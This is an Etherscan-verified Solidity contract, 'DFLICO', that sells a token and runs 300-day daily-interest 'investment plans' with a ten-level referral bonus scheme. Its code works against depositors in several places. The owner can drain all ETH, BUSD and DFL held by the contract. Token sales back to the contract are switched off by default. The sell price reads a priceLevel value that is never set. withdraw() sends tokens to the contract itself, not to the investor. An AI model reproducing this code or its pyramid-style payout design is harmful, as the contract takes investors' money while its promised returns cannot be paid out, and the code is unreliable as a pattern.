/**
 *Submitted for verification at Etherscan.io on 2021-08-14
*/

// Ether
// owner 0x6dA4867268c80BFcc1Fe4515A841eCa6299557Fb
// usdt  0x05bEE198A2991616d3A4864de901bb5c8B88cB9E
// dfl   0x265173f4F69094B7B3a7090b6493912d163DCF39

// Binance
// owner 0x6dA4867268c80BFcc1Fe4515A841eCa6299557Fb
// usdt  0xcf1aecc287027f797b99650b1e020ffa0fb0e248
// dfl   0xdc0be0aa580e5314b2acf889b540c8dd421a3cda
pragma solidity 0.5.4;

interface IBEP20 {
  function totalSupply() external view returns (uint256);
  function balanceOf(address who) external view returns (uint256);
  function allowance(address owner, address spender)
  external view returns (uint256);
  function transfer(address to, uint256 value) external returns (bool);
  function approve(address spender, uint256 value)
  external returns (bool);
  
  function transferFrom(address from, address to, uint256 value)
  external returns (bool);
  function burn(uint256 value)
  external returns (bool);
  event Transfer(address indexed from,address indexed to,uint256 value);
  event Approval(address indexed owner,address indexed spender,uint256 value);
}

library SafeMath {
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

contract DFLICO  {
     using SafeMath for uint256;
     
       struct Investment {
        uint256 planId;
        uint256 investmentDate;
        uint256 investment;
        uint256 lastWithdrawalDate;
        uint256 currentDividends;
        bool isExpired;
    }

    struct Plan {
        uint256 dailyInterest;
        uint256 term; //0 means unlimited
        uint256 maxDailyInterest;
    }
     
    struct User {
        uint id;
        address referrer;
        uint256 levelBonus;
        uint256 selfBuy;
        uint256 selfSell;
        uint256 planCount;
        mapping(uint256 => Investment) plans;
        mapping(uint256 => uint256) refInvest;
        mapping(uint256 => uint256) refMember;
    }
    
    bool public saleOpen=false;
    mapping(address => User) public users;
    mapping(uint => address) public idToAddress;
    Plan[] private investmentPlans_;
    
    uint256 private constant INTEREST_CYCLE = 1 days;

    uint public lastUserId = 2;
    
    uint256 public tokenPrice=1e16;
    uint public  total_token_buy = 0;
	uint public  total_token_sale = 0;
	uint public  priceGap = 0;
	uint64 public  priceIndex = 1;
	
	uint public  MINIMUM_BUY = 1e18;
	uint public  MINIMUM_SALE = 1e17;
	
	
    address public owner;
    
    mapping(uint64 => uint) public buyLevel;
    mapping(uint64 => uint) public priceLevel;

  
    
    event Registration(address indexed user, address indexed referrer, uint indexed userId, uint referrerId, uint256 block_timestamp);
    event CycleStarted(address indexed user, uint256 walletUsed, uint256 rewardUsed, uint256 block_timestamp);
    event TokenDistribution(address indexed sender, address indexed receiver, uint total_token, uint live_rate, uint bnb_amount, uint256 block_timestamp);
    event onWithdraw(address  _user, uint256 withdrawalAmount, uint256 block_timestamp);
   
   IBEP20 private dflToken; 
   IBEP20 private busdToken; 

    constructor(address ownerAddress, IBEP20 _busdToken, IBEP20 _dflToken) public 
    {
        owner = ownerAddress;
        
        dflToken = _dflToken;
        busdToken = _busdToken;
        
        investmentPlans_.push(Plan(33,300*60*60*24,33)); //300 days and 0.33%
        investmentPlans_.push(Plan(42,300*60*60*24,42)); //300 days and 0.42%
        investmentPlans_.push(Plan(50,300*60*60*24,50)); //300 days and 0.5%
        investmentPlans_.push(Plan(58,300*60*60*24,58)); //300 days and 0.58%
        
        User memory user = User({
            id: 1,
            referrer: address(0),
            levelBonus: uint(0),
            selfBuy: uint(0),
            selfSell: uint(0),
            planCount: uint(0)
        });
        
        users[ownerAddress] = user;
        idToAddress[1] = ownerAddress;
    } 
    
    function() external payable 
    {
        if(msg.data.length == 0) {
            return registration(msg.sender, owner,0);
        }
        
        registration(msg.sender, bytesToAddress(msg.data),0);
    }

    function withdrawBalance(uint256 amt,uint8 _type) public 
    {
        require(msg.sender == owner, "onlyOwner");
        if(_type==1)
        msg.sender.transfer(amt);
        else if(_type==2)
        busdToken.transfer(msg.sender,amt);
        else
        dflToken.transfer(msg.sender,amt);
    }
    
   
    
    function registration(address userAddress, address referrerAddress,uint256 amount) private 
    {
        require(!isUserExists(userAddress), "user exists");
        require(isUserExists(referrerAddress), "referrer not exists");
        
        uint32 size;
        assembly {
            size := extcodesize(userAddress)
        }
        
        require(size == 0, "cannot be a contract");
        
        User memory user = User({
            id: lastUserId,
            referrer: referrerAddress,
            levelBonus: 0,
            selfBuy: 0,
            selfSell: 0,
            planCount: 0
        });
        
        users[userAddress] = user;
        idToAddress[lastUserId] = userAddress;
        
        users[userAddress].referrer = referrerAddress;
        
        lastUserId++;
         for(uint8 i=0;i<10;i++)
	     {
             users[referrerAddress].refMember[i]=users[referrerAddress].refMember[i]+1;
             users[referrerAddress].refInvest[i]=users[referrerAddress].refInvest[i]+amount;
             if(users[referrerAddress].referrer!=address(0))
             referrerAddress=users[referrerAddress].referrer;
             else
             break;
	     }
        

        emit Registration(userAddress, referrerAddress, users[userAddress].id, users[referrerAddress].id,block.timestamp);
    }
    
    function _invest(uint256 walletUsed,uint256 rewardUsed,uint256 _planId,address referrer) public 
    {
        require(dflToken.balanceOf(msg.sender)>=walletUsed,"Low wallet balance");
        require(dflToken.allowance(msg.sender,address(this))>=walletUsed,"Allow token first");
        require(users[msg.sender].levelBonus>=rewardUsed,"Low reward balance");
        require(_planId >= 0 && _planId<investmentPlans_.length, "Wrong investment plan id");
        
        uint256 _amount=walletUsed+rewardUsed;
        
        if(!isUserExists(msg.sender))
	    {
	        registration(msg.sender, referrer,_amount);   
	    }
	    require(isUserExists(msg.sender), "user not exists");
        uint256 planCount = users[msg.sender].planCount;
        
        users[msg.sender].plans[planCount].planId = _planId;
        users[msg.sender].plans[planCount].investmentDate = block.timestamp;
        users[msg.sender].plans[planCount].lastWithdrawalDate = block.timestamp;
        users[msg.sender].plans[planCount].investment = _amount;
        users[msg.sender].plans[planCount].currentDividends = 0;
        users[msg.sender].plans[planCount].isExpired = false;

        users[msg.sender].planCount = users[msg.sender].planCount.add(1);
        
        if(msg.sender!=owner)
	    _calculateReferrerReward(_amount,users[msg.sender].referrer);
	    emit CycleStarted(msg.sender, walletUsed, rewardUsed,block.timestamp);
    }

    function buyToken(uint256 tokenQty) public payable
	{
	     require(!isContract(msg.sender),"Can not be contract");
	     require(tokenQty>=MINIMUM_BUY,"Invalid minimum quantity");
	     uint256 buy_amt=(tokenQty/1e18)*tokenPrice;
	     require(busdToken.balanceOf(msg.sender)>=(buy_amt),"Low Balance");
	     require(busdToken.allowance(msg.sender,address(this))>=buy_amt,"Invalid buy amount");
	     
	     users[msg.sender].selfBuy=users[msg.sender].selfBuy+tokenQty;
	     busdToken.transferFrom(msg.sender ,address(this), (buy_amt));
	     dflToken.transfer(msg.sender , tokenQty);
	     
         total_token_buy=total_token_buy+tokenQty;
		 emit TokenDistribution(address(this), msg.sender, tokenQty, tokenPrice, buy_amt,block.timestamp);					
	 }
	 
	function sellToken(uint256 tokenQty) public payable 
	{
	    address userAddress=msg.sender;
	    require(isUserExists(userAddress), "user is not exists. Register first.");
	    require(saleOpen,"Sale Stopped.");
	    require(dflToken.balanceOf(userAddress)>=(tokenQty),"Low Balance");
	    require(dflToken.allowance(userAddress,address(this))>=(tokenQty),"Approve your token First");
	    require(!isContract(userAddress),"Can not be contract");
	    
	    uint256 busd_amt=(tokenQty/1e18)*priceLevel[priceIndex];
	     
		dflToken.transferFrom(userAddress ,address(this), (tokenQty));
		busdToken.transfer(userAddress ,busd_amt);
		 
		users[msg.sender].selfSell=users[msg.sender].selfSell+tokenQty;
		emit TokenDistribution(userAddress,address(this), tokenQty, priceLevel[priceIndex],busd_amt,block.timestamp);
		total_token_sale=total_token_sale+tokenQty;
	 }
	 
	function _calculateReferrerReward(uint256 _investment, address _referrer) private 
	{
	     uint256 oldPercent;
	     uint256 totalPercent;
	     for(uint8 i=0;i<10;i++)
	     {
	         uint256 refPercent=getPercent(_referrer);
	         if(refPercent>oldPercent && totalPercent<250)
	         {
	            uint256 left=refPercent-oldPercent;
	            totalPercent=totalPercent+left;
	            users[_referrer].levelBonus=users[_referrer].levelBonus+(_investment*left)/1000;
	            oldPercent=refPercent;
	         }
	         
             users[_referrer].refInvest[i]=users[_referrer].refInvest[i]+_investment;
             if(users[_referrer].referrer!=address(0))
             _referrer=users[_referrer].referrer;
             else
             break;
	     }
     }
	
	function withdraw() public payable 
	{
        require(msg.value == 0, "withdrawal doesn't allow to transfer trx simultaneously");
        uint256 uid = users[msg.sender].id;
        require(uid != 0, "Can not withdraw because no any investments");
        uint256 withdrawalAmount = 0;
        for (uint256 i = 0; i < users[msg.sender].planCount; i++) 
        {
            if (users[msg.sender].plans[i].isExpired) {
                continue;
            }

            Plan storage plan = investmentPlans_[users[msg.sender].plans[i].planId];

            bool isExpired = false;
            uint256 withdrawalDate = block.timestamp;
            if (plan.term > 0) {
                uint256 endTime = users[msg.sender].plans[i].investmentDate.add(plan.term);
                if (withdrawalDate >= endTime) {
                    withdrawalDate = endTime;
                    isExpired = true;
                }
            }

            uint256 amount = _calculateDividends(users[msg.sender].plans[i].investment , plan.dailyInterest , withdrawalDate , users[msg.sender].plans[i].lastWithdrawalDate , plan.maxDailyInterest);

            withdrawalAmount += amount;
            
            users[msg.sender].plans[i].lastWithdrawalDate = withdrawalDate;
            users[msg.sender].plans[i].isExpired = isExpired;
            users[msg.sender].plans[i].currentDividends += amount;
        }
        
        dflToken.transfer(address(this),(withdrawalAmount/priceLevel[priceIndex]));

        emit onWithdraw(msg.sender, withdrawalAmount/priceLevel[priceIndex],block.timestamp);
    }
    
    function getInvestmentPlanByUID(address _user) public view returns (uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory, uint256[] memory,uint256[] memory, bool[] memory) 
    {
       
        User storage investor = users[_user];
        uint256[] memory planIds = new  uint256[](investor.planCount);
        uint256[] memory investmentDates = new  uint256[](investor.planCount);
        uint256[] memory investments = new  uint256[](investor.planCount);
        uint256[] memory currentDividends = new  uint256[](investor.planCount);
        bool[] memory isExpireds = new  bool[](investor.planCount);
        uint256[] memory newDividends = new uint256[](investor.planCount);
        uint256[] memory interests = new uint256[](investor.planCount);

        for (uint256 i = 0; i < investor.planCount; i++) {
            require(investor.plans[i].investmentDate!=0,"wrong investment date");
            planIds[i] = investor.plans[i].planId;
            currentDividends[i] = investor.plans[i].currentDividends;
            investmentDates[i] = investor.plans[i].investmentDate;
            investments[i] = investor.plans[i].investment;
            if (investor.plans[i].isExpired) {
                isExpireds[i] = true;
                newDividends[i] = 0;
                interests[i] = investmentPlans_[investor.plans[i].planId].dailyInterest;
            } else {
                isExpireds[i] = false;
                if (investmentPlans_[investor.plans[i].planId].term > 0) {
                    if (block.timestamp >= investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term)) {
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, investor.plans[i].investmentDate.add(investmentPlans_[investor.plans[i].planId].term), investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                        isExpireds[i] = true;
                        interests[i] = investmentPlans_[investor.plans[i].planId].dailyInterest;
                    }
                    else{
                        newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                       interests[i] = investmentPlans_[investor.plans[i].planId].maxDailyInterest;
                    }
                } else {
                    newDividends[i] = _calculateDividends(investor.plans[i].investment, investmentPlans_[investor.plans[i].planId].dailyInterest, block.timestamp, investor.plans[i].lastWithdrawalDate, investmentPlans_[investor.plans[i].planId].maxDailyInterest);
                  interests[i] =  investmentPlans_[investor.plans[i].planId].maxDailyInterest;
                }
            }
        }

        return
        (
        planIds,
        investmentDates,
        investments,
        currentDividends,
        newDividends,
        interests,
        isExpireds
        );
    }

	function _calculateDividends(uint256 _amount, uint256 _dailyInterestRate, uint256 _now, uint256 _start , uint256 _maxDailyInterest) private pure returns (uint256) {

        uint256 numberOfDays =  (_now - _start) / INTEREST_CYCLE ;
        uint256 result = 0;
        uint256 index = 0;
        if(numberOfDays > 0){
          uint256 secondsLeft = (_now - _start);
           for (index; index < numberOfDays; index++) {
               if(_dailyInterestRate + index <= _maxDailyInterest ){
                   secondsLeft -= INTEREST_CYCLE;
                     result += (_amount * (_dailyInterestRate + index) / 10000 * INTEREST_CYCLE) / (60*60*24*30);
               }
               else
               {
                 break;
               }
            }

            result += (_amount * (_dailyInterestRate + index) / 10000 * secondsLeft) / (60*60*24*30);

            return result;

        }else{
            return (_amount * _dailyInterestRate / 10000 * (_now - _start)) / (60*60*24*30);
        }

    }
	
	function getPercent(address _user) public view returns(uint16)
	{
	    require(isUserExists(_user),"User Not Exist");
	    uint256 totalDirect=users[_user].refMember[0];
	    uint256 totalTeam;
	    for(uint8 i=0;i<10;i++)
	    {
	       totalTeam=totalTeam+users[_user].refMember[i]; 
	    }
	    
	    if(totalDirect>=25 && totalTeam>=500)
	    return 250;
	    else if(totalDirect>=15 && totalTeam>=250)
	    return 200;
	    else if(totalDirect>=10 && totalTeam>=50)
	    return 150;
	    else
	    return 50;
	    
	}

    function isContract(address _address) public view returns (bool _isContract)
    {
          uint32 size;
          assembly {
            size := extcodesize(_address)
          }
          return (size > 0);
    }    
  
    function token_setting(uint min_buy,  uint min_sale) public payable
    {
           require(msg.sender==owner,"Only Owner");
              MINIMUM_BUY = min_buy;
    	      MINIMUM_SALE = min_sale;
             
    }
    
    function sale_setting(uint8 _type) public payable
    {
        require(msg.sender==owner,"Only Owner");
            if(_type==1)
            saleOpen=true;
            else
            saleOpen=false;
    }
    
    
    
    function isUserExists(address user) public view returns (bool) 
    {
        return (users[user].id != 0);
    }
    
    function bytesToAddress(bytes memory bys) private pure returns (address addr) {
        assembly {
            addr := mload(add(bys, 20))
        }
    }
}